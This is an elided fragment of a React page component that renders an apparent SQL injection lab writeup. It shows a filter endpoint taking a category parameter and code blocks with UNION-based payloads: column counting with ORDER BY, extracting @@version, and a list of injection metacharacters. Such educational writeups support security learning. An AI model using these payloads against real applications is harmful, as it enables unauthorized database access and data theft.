  ...
  return (
    <Layout>
      <div className="mx-auto max-w-3xl px-6 py-20">
        <Link to="/writeups">
          <Button variant="ghost" className="mb-8 -ml-4 text-muted-foreground hover:text-[hsl(var(--brand))]">
        ...
        <header className="mb-12">
          <div className="mb-4 flex flex-wrap gap-2">
            ...
            <Badge variant="secondary" className="border-border bg-secondary text-[hsl(var(--brand))]">
              SQL Injection
            </Badge>
            <Badge variant="secondary" className="border-border bg-secondary text-[hsl(var(--brand))]">
              UNION SELECT
          ...
          <section>
            ...
            <div className="space-y-4 text-muted-foreground">
              ...
              <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                <code className="text-sm text-[hsl(var(--brand))]">/filter?category=&lt;input&gt;</code>
              </pre>
              <p>Backend query executed:</p>
              <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                <code className="text-sm text-[hsl(var(--brand))]">
          ...
          <section>
            ...
            <div className="space-y-6 text-muted-foreground">
              <div>
                ...
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-[hsl(var(--brand))]">' ORDER BY 2--</code>
                </pre>
              </div>
              ...
              <div>
                ...
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-[hsl(var(--brand))]">' UNION SELECT @@version, NULL--</code>
                </pre>
              </div>
          ...
          <section>
            ...
            <div className="space-y-6 text-muted-foreground">
              ...
              <div>
                ...
                <pre className="overflow-x-auto rounded-md border border-operator-border bg-black/50 p-4">
                  <code className="text-sm text-[hsl(var(--brand))]">'  "  ;  --  #  /*  */</code>
                </pre>
              </div>
